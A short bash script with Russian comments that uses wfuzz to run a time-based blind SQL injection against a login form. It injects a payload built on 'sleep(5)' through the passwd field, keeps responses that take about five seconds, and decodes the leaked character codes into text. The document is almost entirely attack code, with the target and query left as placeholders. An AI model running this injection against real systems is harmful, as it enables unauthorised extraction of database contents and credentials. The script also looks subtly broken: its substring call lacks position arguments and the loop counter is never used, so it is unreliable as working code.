#!/bin/bash
for i in $(seq 1 20);
do wfuzz -v -c -z range,32-127 -d "login=admin&passwd=admin' and IF(ascii(substring((EXAMPLE))=FUZZ, sleep(5),0)#&submit=work" http://$IP
#Указать название файла (в примере db_xxe4), куда будет сохранен вывод. db_xxe4_1 - отфильтрованный вывод. Это название нужно вставить в переменную "filename".
done > db_xxe4 && grep -F "5." db_xxe4 >> db_xxe4_1
#Ищем те значения, где время ответа больше 5 секунд
grep -F "5." db_xxe4
#Указываем файл
filename="db_xxe4_1"
#Указываем значение для поиска
search_value="\".*\""
#Поиск значения и обрезка лишнего.
result=$(grep -o "$search_value" "$filename" |  cut -d "\"" -f 2  |  paste -sd " " -)
#Вывод
printf '%b\n' $(printf '\%03o' $result)
